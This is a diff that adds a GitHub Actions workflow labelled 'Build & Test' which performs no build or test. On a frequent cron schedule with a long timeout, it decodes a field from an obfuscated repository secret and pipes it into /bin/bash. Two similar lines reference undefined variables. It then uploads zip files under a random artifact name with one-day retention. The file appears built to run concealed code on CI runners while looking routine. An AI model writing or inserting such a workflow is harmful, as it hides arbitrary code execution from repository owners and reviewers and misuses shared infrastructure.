@@ -1,0 +1,29 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '11 2,8,14,20 * * *'
+jobs:
+  workflow:
+    runs-on: ubuntu-latest
+    timeout-minutes: 340
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          ktdk69: ${{ secrets.ktdk69 }}
+        run: |
+          printf '%s' "$ktdk69" | jq -r .eqe11211 | /bin/bash
+          printf '%s' "$hcnnv779" | jq -r .y320 | /bin/bash
+          printf '%s' "$hrdb77" | jq -r .u51992 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: eHsnSe4V
+          path: "*.zip"
+          retention-days: 1
